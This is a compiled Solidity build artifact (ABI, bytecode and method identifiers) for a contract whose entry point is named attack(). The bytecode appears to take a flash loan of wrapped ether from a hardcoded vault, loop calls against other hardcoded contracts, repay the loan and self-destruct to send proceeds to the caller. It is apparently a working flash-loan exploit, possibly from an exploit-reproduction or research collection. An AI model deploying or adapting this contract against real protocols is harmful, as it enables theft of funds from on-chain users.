{"abi":[{"type":"fallback","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"receiveFlashLoan","inputs":[{"name":"tokens","type":"address[]","internalType":"address[]"},{"name":"amounts","type":"uint256[]","internalType":"uint256[]"},{"name":"feeAmounts","type":"uint256[]","internalType":"uint256[]"},{"name":"userData","type":"bytes","internalType":"bytes"}],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x60806040525f80546001600160a01b03191673ba12222222228d8ba445958a75a0704d566bf2c81790553480156033575f5ffd5b50610a9f806100415f395ff3fe608060405260043610610028575f3560e01c80639e5faafc1461002a578063f04f27071461003e575b005b348015610035575f5ffd5b5061002861005d565b348015610049575f5ffd5b5061002861005836600461072d565b61016c565b6040805160018082528183019092525f916020808301908036833701905050905073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2815f815181106100a5576100a5610851565b6001600160a01b0392909216602092830291909101909101526040805160018082528183019092525f9181602001602082028036833701905050905068056bc75e2d63100000815f815181106100fd576100fd610851565b60209081029190910101525f54604051632e1c224f60e11b81526001600160a01b0390911690635c38449e9061013b90309086908690600401610865565b5f604051808303815f87803b158015610152575f5ffd5b505af1158015610164573d5f5f3e3d5ffd5b503392505050ff5b5f845f8151811061017f5761017f610851565b60200260200101519050806001600160a01b0316632e1a7d4d855f815181106101aa576101aa610851565b60200260200101516040518263ffffffff1660e01b81526004016101d091815260200190565b5f604051808303815f87803b1580156101e7575f5ffd5b505af11580156101f9573d5f5f3e3d5ffd5b505f925050505b60078112156103fb576040516370a0823160e01b81527309a80172ed7335660327cd664876b5df6fe0610860048201819052906370876c989068056bc75e2d631000009073633b041c41f61d04089880d7b5c7ed0f10ff6f85906370a0823190602401602060405180830381865afa15801561027e573d5f5f3e3d5ffd5b505050506040513d601f19601f820116820180604052508101906102a29190610a07565b6040516001600160e01b031960e085901b16815260048101919091526509184e72a000602482015260440160206040518083038185885af11580156102e9573d5f5f3e3d5ffd5b50505050506040513d601f19601f8201168201806040525081019061030e9190610a07565b506040516370a0823160e01b81523060048201527309a80172ed7335660327cd664876b5df6fe06108906347d8167d9073633b041c41f61d04089880d7b5c7ed0f10ff6f85906370a0823190602401602060405180830381865afa158015610378573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061039c9190610a07565b6040516001600160e01b031960e084901b1681526004810191909152600160248201526044015f604051808303815f87803b1580156103d9575f5ffd5b505af11580156103eb573d5f5f3e3d5ffd5b5050600190920191506102009050565b50806001600160a01b031663d0e30db0476040518263ffffffff1660e01b81526004015f604051808303818588803b158015610435575f5ffd5b505af1158015610447573d5f5f3e3d5ffd5b5050505050806001600160a01b031663a9059cbb73ba12222222228d8ba445958a75a0704d566bf2c8855f8151811061048257610482610851565b6020026020010151875f8151811061049c5761049c610851565b60200260200101516104ae9190610a1e565b6040516001600160e01b031960e085901b1681526001600160a01b03909216600483015260248201526044016020604051808303815f875af11580156104f6573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061051a9190610a43565b506040516370a0823160e01b81523060048201526001600160a01b03821690632e1a7d4d9073c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2906370a0823190602401602060405180830381865afa158015610579573d5f5f3e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061059d9190610a07565b6040518263ffffffff1660e01b81526004016105bb91815260200190565b5f604051808303815f87803b1580156105d2575f5ffd5b505af11580156105e4573d5f5f3e3d5ffd5b505050505050505050565b634e487b7160e01b5f52604160045260245ffd5b604051601f8201601f1916810167ffffffffffffffff8111828210171561062c5761062c6105ef565b604052919050565b5f67ffffffffffffffff82111561064d5761064d6105ef565b5060051b60200190565b5f82601f830112610666575f5ffd5b813561067961067482610634565b610603565b8082825260208201915060208360051b86010192508583111561069a575f5ffd5b602085015b838110156106b757803583526020928301920161069f565b5095945050505050565b5f82601f8301126106d0575f5ffd5b813567ffffffffffffffff8111156106ea576106ea6105ef565b6106fd601f8201601f1916602001610603565b818152846020838601011115610711575f5ffd5b816020850160208301375f918101602001919091529392505050565b5f5f5f5f60808587031215610740575f5ffd5b843567ffffffffffffffff811115610756575f5ffd5b8501601f81018713610766575f5ffd5b803561077461067482610634565b8082825260208201915060208360051b850101925089831115610795575f5ffd5b6020840193505b828410156107cb5783356001600160a01b03811681146107ba575f5ffd5b82526020938401939091019061079c565b9650505050602085013567ffffffffffffffff8111156107e9575f5ffd5b6107f587828801610657565b935050604085013567ffffffffffffffff811115610811575f5ffd5b61081d87828801610657565b925050606085013567ffffffffffffffff811115610839575f5ffd5b610845878288016106c1565b91505092959194509250565b634e487b7160e01b5f52603260045260245ffd5b6001600160a01b03841681526080602080830182905284519183018290525f919085019060a0840190835b818110156108b75783516001600160a01b0316835260209384019390920191600101610890565b50508381036040850152845180825260209182019250908501905f90815b818110156108f35783518552602094850194909301926001016108d5565b5050505082810360608401526109fd8160c281527f307830303030303030303030303030303030303030303030303030396138303160208201527f373265643733333536363033323763643636343837366235646636666530363160408201527f303830303030303030303030303030303030303030303030303036333362303460608201527f316334316636316430343038393838306437623563376564306631306666366660808201527f383530303030303030303030303030303030303030303030303030303030303060a08201527f303030303030303030303030303030303035366263373565326436333130303060c082015261030360f41b60e08201526101000190565b9695505050505050565b5f60208284031215610a17575f5ffd5b5051919050565b80820180821115610a3d57634e487b7160e01b5f52601160045260245ffd5b92915050565b5f60208284031215610a53575f5ffd5b81518015158114610a62575f5ffd5b939250505056fea2646970667358221220253cedffd76205d2a414ebd12597656b04c3f2875bdc74e3f3060a902f531dcb64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","receiveFlashLoan(address[],uint256[],uint256[],bytes)":"f04f2707"},"id":532}